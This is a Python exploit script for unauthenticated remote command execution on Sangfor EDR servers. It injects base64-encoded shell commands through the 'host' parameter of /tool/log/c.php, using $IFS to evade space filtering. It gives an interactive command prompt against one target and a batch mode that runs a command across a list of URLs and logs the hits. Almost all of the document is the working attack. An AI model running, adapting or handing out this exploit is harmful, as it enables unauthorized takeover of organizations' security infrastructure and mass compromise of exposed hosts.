import requests
import re
import urllib3
import sys
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def hello():
    """
    init function
    :return: init print
    """
    print (
    """SangFor EDR remote command code exploit
    Angel 20200817
    
    Github: https://github.com/A2gel/sangfor-edr-exploit
    
    Command: python edr.py url http://10.10.10.0/
    Command: python edr.py file 1.txt whoami""")

def readFile(filename):
    """
    逐行读取文件内容并返回列表
    :param filename: 文件名
    :return: 逐行分割的文件内容
    """
    list=[]
    keywords = open('./'+filename, 'r')
    line = keywords.readline().strip('\n')
    while (line):
        list.append(line)
        line = keywords.readline().strip('\n')
    keywords.close()
    return list


def log(name,value):
    """
    逐行写入文件
    :param name: 文件名
    :param value: 文件内容
    :return: 空
    """
    save = file(str(name)+".txt", "a+")
    save.write(str(value)+"\n")
    save.close()


def rce(host,command):
    """
    远程命令执行核心函数
    
    :param host: URL信息
    :param command: 执行的命令
    :return: 成功执行返回命令回显 失败打印faild 返回-
    """
    headers={
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'

    }
    command=base64.b64encode(command)
    command="echo \""+command+"\""+"|base64 -d|bash"
    command = command.replace(" ","$IFS")

    url="{}/tool/log/c.php?strip_slashes=system&host={}".format(host,command)
    #print url
    try:
        response = requests.get(url,verify=False,headers=headers)
        response.raise_for_status()
        response.encoding = "utf-8"
        #print response.text
        res=re.findall(r'<b>Log Helper</b></p>(.+?)<pre><form',response.text,re.S)
        response.close()
        print(res[0])
        return "+"
    except:
        print('failed')
        return "-"

if __name__ == '__main__':
    if len(sys.argv) < 2:
        hello()
    else:
        if sys.argv[1] == "url":
            while 1:
                command = raw_input("Command> ")
                if command:
                    print ("Try %s"%sys.argv[2])
                    rce(sys.argv[2],command)
                else:
                    print ("Please input Command")
                command = ""

        elif sys.argv[1] == "file":
            if (sys.argv) < 3:
                print "Command: python edr.py file url.txt"
            else:
                for i in readFile(sys.argv[2]):
                    print ("Try %s"%i)
                    if rce(i,sys.argv[3]) == "+":
                        log("success",sys.argv[3])
                    else:
                        log("error",sys.argv[3])
        else:
            hello()
